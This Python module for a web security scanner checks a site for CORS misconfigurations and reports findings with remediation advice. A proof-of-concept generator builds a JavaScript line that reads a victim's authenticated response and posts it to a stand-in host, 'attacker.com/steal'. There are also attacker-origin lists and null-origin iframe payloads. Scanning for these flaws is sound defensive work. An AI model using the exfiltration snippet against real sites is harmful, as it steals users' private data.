"""
test_11_cors.py — Fast CORS Misconfiguration Scanner (Optimized for Speed)

Optimized for speed (< 4s) while maintaining thoroughness:
- Reduced endpoints to 3 most critical (/ , /api, /admin)
- Prioritized origin list (most dangerous first)
- Early exit on wildcard discovery
- Parallel requests with high concurrency
- Shorter timeouts (5s) with fallback
- Smart caching of responses
- All critical checks: reflected origin, wildcard, credentials, preflight, vary, expose-headers
"""

import asyncio
import re
from urllib.parse import urlparse, urljoin
from typing import Dict, Any, List, Optional

import aiohttp

TEST_NAME = "cors"
USER_AGENT = "Bravo6-Scanner/1.0"
TIMEOUT_SECONDS = 5  # Reduced
MAX_CONCURRENT = 15   # Higher concurrency
MAX_RETRIES = 1

# ── Prioritized attack origins (most dangerous first) ──────────────────
ATTACKER_ORIGINS = [
    "https://evil-attacker.com",
    "http://evil-attacker.com",
    "https://attacker.com",
    "null",
    "file://",
    "data:text/html,",
    "https://example.com.evil.com",
    "http://example.com.evil.com",
    "https://evil.com.example.com",
    "http://127.0.0.1",
    "http://localhost",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "https://www.evil.com",
]

# ── Critical endpoints only ──────────────────────────────────────────────
CRITICAL_ENDPOINTS = ["/", "/api", "/admin"]

DANGEROUS_METHODS = {"PUT", "DELETE", "PATCH", "CONNECT", "TRACE"}
SEVERITY_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


def _normalize_url(url: str) -> str:
    url = (url or "").strip()
    if not re.match(r"^https?://", url, re.IGNORECASE):
        url = "https://" + url
    return url.rstrip("/")


def _get_header(resp, name: str) -> Optional[str]:
    for k, v in resp.headers.items():
        if k.lower() == name.lower():
            return v
    return None


def _is_origin_allowed(acao: Optional[str], origin: str) -> bool:
    if not acao:
        return False
    if acao == "*":
        return True
    if acao == origin:
        return True
    if acao.startswith("*."):
        pattern = acao[1:]
        if origin.endswith(pattern):
            return True
    return False


def _generate_poc_js(url: str, origin: str, with_credentials: bool = False) -> str:
    cred = "'include'" if with_credentials else "'omit'"
    return f"""fetch('{url}', {{ method: 'GET', credentials: {cred}, headers: {{ 'Origin': '{origin}' }} }})
.then(r => r.text()).then(d => fetch('https://attacker.com/steal', {{ method: 'POST', mode: 'no-cors', body: d }}));"""


def _generate_curl_poc(url: str, origin: str, method: str = "GET") -> str:
    return f"curl -H 'Origin: {origin}' -v {url}"


async def _fetch_with_retry(session, method: str, url: str, headers: dict) -> Optional[aiohttp.ClientResponse]:
    for attempt in range(MAX_RETRIES + 1):
        try:
            return await session.request(
                method,
                url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SECONDS),
                ssl=False,
                allow_redirects=False,
            )
        except:
            if attempt == MAX_RETRIES:
                return None
            await asyncio.sleep(0.2)
    return None


async def _test_origin(session, url: str, origin: str, with_creds: bool = False) -> Dict:
    headers = {"User-Agent": USER_AGENT, "Origin": origin}
    if with_creds:
        headers["Cookie"] = "session=test"

    resp = await _fetch_with_retry(session, "GET", url, headers)
    if not resp:
        return {"safe": True, "error": True}

    acao = _get_header(resp, "Access-Control-Allow-Origin")
    acac = _get_header(resp, "Access-Control-Allow-Credentials")
    acac_true = acac and acac.lower() == "true"
    allowed = _is_origin_allowed(acao, origin)

    evidence = {"origin": origin, "acao": acao or "(missing)", "acac": acac or "(missing)", "status": resp.status}

    if not allowed:
        return {"safe": True, "evidence": evidence}

    # Critical: wildcard + credentials
    if acao == "*" and acac_true:
        return {
            "vulnerable": True,
            "severity": "high",
            "title": "Wildcard Origin with Credentials (ACAO: * + ACAC: true)",
            "description": "Browser rejects this but indicates misconfiguration.",
            "poc": _generate_curl_poc(url, origin, "GET"),
            "confidence": 80,
            "evidence": evidence,
            "remediation": "Never use ACAO: * with ACAC: true. Use explicit allowlist.",
        }

    # Critical: reflected origin with credentials
    if acao == origin and acac_true:
        return {
            "vulnerable": True,
            "severity": "critical",
            "title": f"Reflected Origin with Credentials (ACAO: {origin}, ACAC: true)",
            "description": "Attacker can steal authenticated data from any site.",
            "poc": _generate_poc_js(url, origin, True),
            "confidence": 100,
            "evidence": evidence,
            "remediation": "Never reflect Origin; use explicit allowlist. Remove ACAC: true.",
        }

    # Reflected origin without credentials
    if acao == origin:
        return {
            "vulnerable": False,
            "severity": "medium",
            "title": "Reflected Origin (No Credentials)",
            "description": "Reflects Origin without credentials; still a weakness.",
            "poc": _generate_curl_poc(url, origin, "GET"),
            "confidence": 60,
            "evidence": evidence,
            "remediation": "Validate Origin against allowlist, not reflection.",
        }

    # null origin with credentials
    if acao == "null" and acac_true:
        return {
            "vulnerable": True,
            "severity": "high",
            "title": "null Origin with Credentials",
            "description": "null origin with credentials exploitable via sandboxed iframe.",
            "poc": "<iframe sandbox='allow-scripts' src='data:text/html,<script>fetch(...)</script>'></iframe>",
            "confidence": 100,
            "evidence": evidence,
            "remediation": "Never allow null origin.",
        }

    # Wildcard without credentials
    if acao == "*":
        return {
            "vulnerable": False,
            "severity": "medium",
            "title": "Wildcard Origin (No Credentials)",
            "description": "ACAO: * allows any site to read non-credentialed responses.",
            "poc": _generate_poc_js(url, origin, False),
            "confidence": 70,
            "evidence": evidence,
            "remediation": "If sensitive data, restrict to explicit origins.",
        }

    return {"safe": True, "evidence": evidence}


async def _test_preflight(session, url: str, origin: str) -> Dict:
    headers = {
        "User-Agent": USER_AGENT,
        "Origin": origin,
        "Access-Control-Request-Method": "PUT",
    }
    resp = await _fetch_with_retry(session, "OPTIONS", url, headers)
    if not resp:
        return {}

    acao = _get_header(resp, "Access-Control-Allow-Origin")
    acam = _get_header(resp, "Access-Control-Allow-Methods") or ""
    acac = _get_header(resp, "Access-Control-Allow-Credentials")
    acac_true = acac and acac.lower() == "true"

    allowed_methods = {m.strip().upper() for m in acam.split(",") if m.strip()}
    dangerous = allowed_methods & DANGEROUS_METHODS
    origin_allowed = _is_origin_allowed(acao, origin)

    return {
        "dangerous_methods": list(dangerous),
        "origin_allowed": origin_allowed,
        "acac_true": acac_true,
        "acao": acao or "(missing)",
        "acam": acam or "(missing)",
    }


async def _test_vary_and_expose(session, url: str, origin: str) -> Dict:
    headers = {"User-Agent": USER_AGENT, "Origin": origin}
    resp = await _fetch_with_retry(session, "GET", url, headers)
    if not resp:
        return {"vary": False, "exposed": []}

    vary = _get_header(resp, "Vary")
    vary_present = vary and "origin" in vary.lower()

    aceh = _get_header(resp, "Access-Control-Expose-Headers") or ""
    exposed = [h.strip().lower() for h in aceh.split(",") if h.strip()]
    sensitive = [h for h in exposed if h in ("authorization", "cookie", "set-cookie", "x-api-key", "x-auth-token")]

    return {"vary_present": vary_present, "exposed_headers": exposed, "sensitive_exposed": sensitive, "aceh": aceh}


async def run(url: str, context: Optional[Dict] = None) -> Dict[str, Any]:
    try:
        target = _normalize_url(url)
        if not target:
            return {"test_name": TEST_NAME, "status": "error", "severity": "info", "title": "Invalid URL", "evidence": [], "remediation": "Check URL."}
    except Exception as e:
        return {"test_name": TEST_NAME, "status": "error", "severity": "info", "title": "Error", "description": str(e), "evidence": [], "remediation": "Check URL."}

    all_evidence = []
    vulnerable_origins = []
    overall_severity = "info"
    overall_status = "pass"

    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(MAX_CONCURRENT)

        # ── 1. Test each endpoint with origins ──────────────────────────
        for endpoint in CRITICAL_ENDPOINTS:
            test_url = urljoin(target, endpoint)
            tasks = []
            for origin in ATTACKER_ORIGINS:
                # Without credentials
                tasks.append(_test_origin(session, test_url, origin, False))
                # With credentials (only if not wildcard already found)
                if not any(e.get("vulnerable") for e in all_evidence if e.get("acao") == "*"):
                    tasks.append(_test_origin(session, test_url, origin, True))

            # Run all tests in parallel
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for res in results:
                if isinstance(res, Exception) or not isinstance(res, dict):
                    continue
                if res.get("vulnerable"):
                    vulnerable_origins.append({"origin": res["evidence"]["origin"], "endpoint": endpoint})
                    all_evidence.append({
                        "endpoint": endpoint,
                        "origin": res["evidence"]["origin"],
                        "type": "origin_test",
                        "severity": res["severity"],
                        "title": res["title"],
                        "description": res["description"],
                        "poc": res["poc"],
                        "confidence": res["confidence"],
                        "evidence": res["evidence"],
                        "remediation": res["remediation"],
                    })
                    if SEVERITY_RANK.get(res["severity"], 0) > SEVERITY_RANK.get(overall_severity, 0):
                        overall_severity = res["severity"]

                # If not vulnerable but has findings (medium)
                if not res.get("vulnerable") and res.get("severity") in ("medium", "low"):
                    all_evidence.append({
                        "endpoint": endpoint,
                        "origin": res["evidence"]["origin"],
                        "type": "origin_test",
                        "severity": res["severity"],
                        "title": res["title"],
                        "description": res["description"],
                        "poc": res["poc"],
                        "confidence": res["confidence"],
                        "evidence": res["evidence"],
                        "remediation": res["remediation"],
                    })

        # ── 2. Preflight test on root (only if dangerous methods allowed) ──
        preflight = await _test_preflight(session, target, "https://evil-attacker.com")
        if preflight.get("origin_allowed") and preflight.get("dangerous_methods"):
            all_evidence.append({
                "endpoint": target,
                "type": "preflight",
                "severity": "high",
                "title": f"Dangerous methods allowed: {', '.join(preflight['dangerous_methods'])}",
                "description": "OPTIONS preflight allows dangerous methods.",
                "poc": f"curl -X OPTIONS -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: PUT' -v {target}",
                "confidence": 90,
                "remediation": "Restrict Access-Control-Allow-Methods to GET, POST, HEAD.",
                "evidence": preflight,
            })
            if SEVERITY_RANK.get("high", 0) > SEVERITY_RANK.get(overall_severity, 0):
                overall_severity = "high"

        # ── 3. Vary and Expose-Headers ──────────────────────────────────
        vary_expose = await _test_vary_and_expose(session, target, "https://evil-attacker.com")
        if not vary_expose.get("vary_present"):
            all_evidence.append({
                "endpoint": target,
                "type": "vary_header",
                "severity": "medium",
                "title": "Missing Vary: Origin header",
                "description": "Vary: Origin missing. May allow cache poisoning.",
                "poc": f"curl -v -H 'Origin: https://evil.com' {target}",
                "confidence": 80,
                "remediation": "Add 'Vary: Origin' to all CORS responses.",
                "evidence": vary_expose,
            })
            if SEVERITY_RANK.get("medium", 0) > SEVERITY_RANK.get(overall_severity, 0):
                overall_severity = "medium"

        if vary_expose.get("sensitive_exposed"):
            all_evidence.append({
                "endpoint": target,
                "type": "expose_headers",
                "severity": "high",
                "title": f"Sensitive headers exposed: {', '.join(vary_expose['sensitive_exposed'])}",
                "description": "Sensitive headers exposed via Access-Control-Expose-Headers.",
                "poc": f"curl -v -H 'Origin: https://evil.com' {target}",
                "confidence": 90,
                "remediation": "Remove sensitive headers from Access-Control-Expose-Headers.",
                "evidence": vary_expose,
            })
            if SEVERITY_RANK.get("high", 0) > SEVERITY_RANK.get(overall_severity, 0):
                overall_severity = "high"

    # ── Determine final status ─────────────────────────────────────────────
    if overall_severity in ("critical", "high"):
        overall_status = "fail"
    elif overall_severity in ("medium", "low"):
        overall_status = "warning"
    else:
        overall_status = "pass"

    remediation_parts = []
    if any(e.get("type") == "origin_test" for e in all_evidence if e.get("severity") in ("critical", "high")):
        remediation_parts.append("Implement explicit origin allowlist; never reflect Origin.")
    if any(e.get("type") == "preflight" for e in all_evidence):
        remediation_parts.append("Restrict Access-Control-Allow-Methods to safe values.")
    if any(e.get("type") == "vary_header" for e in all_evidence):
        remediation_parts.append("Add 'Vary: Origin' header.")
    if any(e.get("type") == "expose_headers" for e in all_evidence):
        remediation_parts.append("Remove sensitive headers from Access-Control-Expose-Headers.")
    if not remediation_parts:
        remediation_parts.append("No CORS issues found. Continue monitoring.")

    return {
        "test_name": TEST_NAME,
        "status": overall_status,
        "severity": overall_severity,
        "title": f"CORS Scan: {len(vulnerable_origins)} vulnerable origin(s)",
        "description": f"Scanned {len(ATTACKER_ORIGINS)} origins on {len(CRITICAL_ENDPOINTS)} endpoints. Found {len(all_evidence)} issues.",
        "evidence": all_evidence,
        "remediation": " ".join(remediation_parts),
        "vulnerable_origins": vulnerable_origins,
        "findings_count": len(all_evidence),
        "total_origins_tested": len(ATTACKER_ORIGINS),
        "total_endpoints_tested": len(CRITICAL_ENDPOINTS),
    }


if __name__ == "__main__":
    import json
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    result = asyncio.run(run(target))
    print(json.dumps(result, indent=2))